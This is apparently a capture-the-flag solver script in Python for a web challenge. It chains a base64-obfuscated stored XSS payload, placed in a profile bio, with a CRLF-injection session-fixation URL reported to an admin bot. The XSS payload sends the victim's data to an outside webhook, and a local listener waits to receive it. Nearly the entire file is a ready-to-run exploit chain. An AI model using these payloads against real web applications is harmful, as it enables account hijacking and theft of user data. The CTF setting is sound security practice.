import requests, sys, random, base64, time
import asyncio
from aiohttp import web

if len(sys.argv) != 2:
    print("Usage: python3 solver.py host:port\n\nExample: python3 solver.py 127.0.0.1:1337")
    sys.exit(1)

hostURL = 'http://' + sys.argv[1]
userName = 'raywhawx%d' % random.randint(1111,9999) # new username
userPwd = 'raywhawx%d' % random.randint(1111,9999) # new password
  
def register():
    jData = { "username": userName, "email": userName + "@gmail.com","password": userPwd }
    req_stat = requests.post("%s/api/register" %hostURL,json=jData).status_code
    if not req_stat == 201:
        print("Something went wrong! Is the challenge host live?")
        sys.exit()

def login():
    jData = { "username": userName, "password": userPwd }
    authCookie = requests.post("%s/api/login" % hostURL,json=jData).cookies.get('session')

    if not authCookie:
        print("Something went wrong while logging in!")
        sys.exit()

    return authCookie
    
def generate_xss_payload(webhook):
    exfilPayload = """
    fetch('/api/auth').then(res => res.json()).then(data => {new Image().src = '%s?flag=' + data.user.flag;})
    """ % webhook
    base64Payload = base64.b64encode(exfilPayload.encode('utf-8')).decode('utf-8')
    evalPayload = f"<img src=1 onerror=eval(atob('{base64Payload}'))>"
    return evalPayload
    
def update_profile(session, xss_payload):
    postData = {"username": userName, "email": userName + "@gmail.com","bio": xss_payload}
    response = requests.post("%s/api/profile" % hostURL, json=postData,cookies={'session': session})
    if response.status_code != 200:
        print("Something went wrong while updating profile!")
        print(response.text)
        sys.exit()

def generate_crlf_payload(session):
    crlf_payload = f"/invite/aaa%0D%0ASet-Cookie:%20session={session};%20Path=/api/profile"
    return crlf_payload

def report_to_admin(session, crlf_payload):
    postData = {"postThread": crlf_payload, "reason": "I breathe JS"}
    response = requests.post("%s/api/report" % hostURL, json=postData,
    cookies={'session': session})
    if response.status_code != 200:
        print("Something went wrong while reporting to admin!")
        print(response.text)
        sys.exit()

flag_result = None

async def handle_flag(request):
    global flag_result
    flag = request.rel_url.query.get('flag')
    if flag:
        print(f'[~] Flag arrived: {flag}')
        flag_result = flag
        return web.Response(text='ok')
    return web.Response(text='no flag')

async def start_server():
    app = web.Application()
    app.router.add_get('/', handle_flag)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', 80)  # 监听 8080 端口
    await site.start()
    print('[+] HTTP server started on 0.0.0.0:80')

def main():
    print('[+] Signing up a new account..')
    register()
    print('[+] Logging in..')
    session = login()
    print('[+] Generating webhook token..')
    webhook = "http://192.168.0.1" # 反弹地址
    webhookURL = webhook + '/'
    print('[+] Generating XSS payload..')
    XSSPayload = generate_xss_payload(webhookURL)
    print('[+] Updating profile bio with XSS payload..')
    update_profile(session, XSSPayload)
    print('[+] Generating session fixation CRLF payload..')
    CRLFPayload = generate_crlf_payload(session)
    print('[+] Reporting CRLF URI to the admin..')
    report_to_admin(session, CRLFPayload)
    print('[+] Waiting for flag to arrive on webhook..')

    # 启动异步HTTP服务并等待flag
    loop = asyncio.get_event_loop()
    loop.run_until_complete(start_server())
    try:
        while not flag_result:
            loop.run_until_complete(asyncio.sleep(1))
    except KeyboardInterrupt:
        pass

    print('[~] Flag arrived: {}'.format(flag_result))
    print('[~] Cleaning up the webhook')

if __name__ == "__main__":
    main()